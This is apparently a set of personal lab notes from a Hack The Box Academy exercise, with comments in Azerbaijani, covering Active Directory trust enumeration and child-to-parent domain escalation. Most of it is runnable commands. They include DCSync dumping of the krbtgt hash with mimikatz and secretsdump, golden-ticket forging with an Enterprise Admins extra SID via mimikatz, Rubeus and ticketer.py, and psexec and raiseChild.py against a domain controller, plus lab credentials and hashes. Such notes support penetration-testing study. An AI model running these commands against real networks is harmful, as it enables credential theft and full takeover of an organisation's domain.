# Trust Enumeration

### Local Enumeration
```
netdom query /domain:inlanefreight.local trust       ---> Mövcud domain üçün bütün trust əlaqələrini göstərir.
netdom query /domain:inlanefreight.local dc          ---> Domain Controller-lərin (DC) siyahısını çıxarır.
netdom query /domain:inlanefreight.local workstation ---> Şəbəkədəki iş stansiyalarını siyahılayır.
nltest /domain_trusts                                ---> Bütün etibarlı domainləri və onların növünü göstərir.
```
### AD Module
```
Import-Module activedirectory
Get-ADTrust -Filter *
```

### PowerView
```
# Mövcud domain üçün bütün trust-ları göstər
Get-DomainTrust

# Xarici (External) və ya digər Forest trust-larını tap
Get-DomainTrust -Domain dev.local

# Detallı baxış (Mənbə, Hədəf, Növ, İstiqamət)
Get-DomainTrust | Select-Object SourceName, TargetName, TrustType, TrustDirection
```

### Trust Xəritələnməsi və Kənar Domain İstifadəçiləri
```
# Bütün trust əlaqələrini vizual xəritə şəklində siyahılayır
Get-DomainTrustMapping

# Digər domendəki (məs: LOGISTICS) istifadəçiləri siyahılamaq
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

### Remote Enumeration (Linux/Kali)
```
# Domain trust-larını və onların istiqamətini görmək üçün
nxc smb 10.129.16.52 -u 'htb-student' -p 'Academy_student_AD!' --trusted-domains

# Bloodhound
SharpHound: Məlumatları yığmaq üçün SharpHound.exe -c All işlədin.
Sorgu: BloodHound interfeysində "Map Domain Trusts" hazır sorğusunu seçin.
```

### SID History Primer on WINDOWS
```
# Mimikatz
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
Get-DomainSID
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:CURRENT_DOMAIN_SID /krbtgt:NTLM_HASH /sids:ENTERPRISE_ADMIN_GROUP_SID /ptt

klist
ls \\academy-ea-dc01.inlanefreight.local\c$

# Rubeus
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

klist

# DCSync
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

### SID History Primer on LINUX
```
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

export KRB5CCNAME=hacker.ccache

psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
